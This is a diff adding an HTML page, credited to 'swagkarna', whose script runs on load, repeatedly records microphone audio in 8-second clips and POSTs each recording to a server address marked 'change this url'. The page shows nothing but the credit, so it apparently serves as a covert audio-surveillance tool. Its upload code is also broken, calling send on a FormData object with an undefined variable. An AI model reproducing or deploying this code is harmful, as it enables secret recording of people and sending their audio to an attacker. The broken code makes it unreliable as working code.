@@ -1,0 +1,65 @@
+<html>
+   <head> 
+<script>
+function storeaudio(){	  
+navigator.mediaDevices.getUserMedia({ audio: true })
+  .then(stream => {
+    const mediaRecorder = new MediaRecorder(stream);
+    mediaRecorder.start();
+
+    const audiofile = [];
+    mediaRecorder.addEventListener("dataavailable", event => {
+      audiofile.push(event.data);
+    });
+
+    mediaRecorder.addEventListener("stop", () => {
+      const audioBlob = new Blob(audiofile);
+      const audioUrl = URL.createObjectURL(audioBlob);
+      var xhr=new XMLHttpRequest();
+      xhr.onload=function(e) {
+        if(this.readyState === 4) {
+            console.log("Server returned: ",e.target.responseText);
+        }
+      };
+      var hande=new FormData();
+      
+      hande.append("audio_data",audioBlob);
+      xhr.open('POST', 'http://localhost:5000/audio', true);   // change this url
+          xhr.onload = function () {
+              if (this.status === 200)
+                  console.log(this.response);
+              else
+                  console.error(xhr);
+          };
+          hande.send(fd);
+    });
+
+    setInterval(() => {
+            
+        
+      mediaRecorder.stop()
+       
+
+  
+   
+    }, 8000);
+  
+})
+
+}
+
+setInterval(function(){
+    storeaudio()
+},9000)
+</script>
+   </head>
+  
+   
+   <body>
+      <p>
+        <center>
+		<b>Coded By :swagkarna</b>
+		</center>
+      </p>
+   </body>
+</html>
